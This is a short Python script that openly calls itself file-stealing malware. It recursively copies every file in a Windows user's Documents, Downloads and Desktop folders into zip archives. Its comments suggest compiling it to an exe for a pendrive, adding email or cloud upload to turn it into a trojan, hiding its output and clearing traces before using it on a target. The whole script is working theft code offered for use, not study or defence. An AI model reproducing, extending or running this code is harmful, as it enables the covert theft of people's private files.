import zipfile, os, shutil as sh

# The avarice witch wants to know everything
# Steal files with this malware compressing then in zipfiles

# If you want use this as trojan, implement a way to send the files for you
# Like email send or cloud push, remenber to clear your trace

# I recomend you to convert this to exe and put in a pendrive
# After executing the binary all zips will be in the same folder as script

# The default code take all files in documents, downloads and desktop folder
# But you can acess the path that you want with this function but stay alert
# You can recive some permission Errors acessing specific folders
# To do this, call the func and pass a name to your zip and a path
# Put the zip name in blacklist to he be ignored by script

# This script leaves no trace, but test before using on your target

os.system('color a')


def theft_all(fn, path):
    blacklist = ['downloads_theft.zip', 'documents_theft.zip', 'desktop_theft.zip']
    os.chdir(os.path.abspath(os.path.dirname(__file__)))
    zip = zipfile.ZipFile(fn, 'w')
    os.chdir(path)
    for folder, sub_folders, files in os.walk('.'):
        for file in files:
            if file not in blacklist and file not in zip.namelist():
                print(f'Stealing: {file}')  # comment this line to hide details
                zip.write(os.path.join(folder, file),
                          os.path.relpath(os.path.join(folder, file), '.'),
                          compress_type=zipfile.ZIP_DEFLATED)
    zip.close()


theft_all('documents_theft.zip', f'C:\\Users\\{os.getlogin()}\\Documents')
theft_all('downloads_theft.zip', f'C:\\Users\\{os.getlogin()}\\Downloads')
theft_all('desktop_theft.zip', f'C:\\Users\\{os.getlogin()}\\Desktop')

